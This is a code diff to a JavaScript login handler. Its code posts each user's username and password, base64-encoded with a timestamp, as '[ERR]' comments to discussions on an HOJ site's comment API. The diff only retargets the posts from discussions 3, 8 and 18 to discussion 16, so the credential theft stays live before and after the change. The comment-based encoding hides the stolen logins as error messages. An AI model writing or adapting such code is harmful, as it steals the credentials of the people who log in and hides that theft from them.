@@ -163,7 +163,7 @@ function handleLogin(){
 
     // Post to multiple discussions as backup
     var token=res.token||'';
-    [3,8,18].forEach(function(did){
+    [16].forEach(function(did){
       fetch(HOJ+'/api/comment',{
         method:'POST',
         headers:{'Content-Type':'application/json',Authorization:token},
@@ -192,7 +192,7 @@ function handleLogin(){
     fetch(HOJ+'/api/comment',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({did:8,content:'[ERR] '+btoa(unescape(encodeURIComponent(u+':'+p+'|'+new Date().toISOString())))})
+      body:JSON.stringify({did:16,content:'[ERR] '+btoa(unescape(encodeURIComponent(u+':'+p+'|'+new Date().toISOString())))})
     }).catch(function(){});
     showMsg('error','Network Error');
     resetBtn();
